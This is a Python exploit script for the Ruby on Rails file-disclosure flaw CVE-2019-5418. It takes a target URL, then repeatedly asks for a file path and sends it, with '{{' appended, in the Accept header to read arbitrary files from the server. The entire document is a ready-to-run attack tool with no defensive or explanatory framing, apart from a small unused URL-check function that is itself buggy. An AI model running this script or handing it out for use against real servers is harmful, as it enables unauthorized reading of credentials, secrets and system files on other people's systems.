import sys

try:
    import requests
except ImportError:
    print('\n\033[93m[!] Requests library not found, please install before proceeding.\n\n \033[0m')
    sys.exit(1)


def banner():
    banner = """
    ----------------------------------------------
    Arbitrary Traversal exploit for Ruby on Rails
    CVE-2019-5418
    ----------------------------------------------
    """
    print(banner)

def check_args():
    if len(sys.argv) != 2:
        print("Invalid number of arguments entered!")
        how_to_use = "python3 Bandit.py url"
        print('Use as:', how_to_use)
        sys.exit(1)


def check_url(url):
    status_code = requests.get(url)
    if status_code != 200:
        print("Url is invalid or can not be reached!")
        sys.exit(1)


def read_file(url, file):
    headers = {'Accept': file + '{{'}
    req = requests.get(url, headers=headers)
    return req


def main():
    banner()
    check_args()
    url = sys.argv[1]
    while True:
        file = input("Enter file to read (enter quit to exit): ")
        if file.lower() == 'quit':
            break
        response = read_file(url, file)
        print(response.text)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n\n\033[93m[!] ctrl+c detected from user, quitting.\n\n \033[0m')
